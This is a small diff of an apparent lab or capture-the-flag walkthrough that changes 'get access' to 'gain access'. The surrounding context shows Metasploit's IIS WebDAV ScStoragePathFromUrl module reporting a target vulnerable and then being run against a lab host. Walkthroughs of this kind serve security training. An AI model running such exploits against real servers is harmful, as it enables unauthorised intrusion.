@@ -275,7 +275,7 @@ msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
 [+] 10.10.10.14:80 - The target is vulnerable.
 ```
 
-As the host seems to be vulnerable to this exploit, let's proceed to run it in order to get access to the server:
+As the host seems to be vulnerable to this exploit, let's proceed to run it in order to gain access to the server:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
 
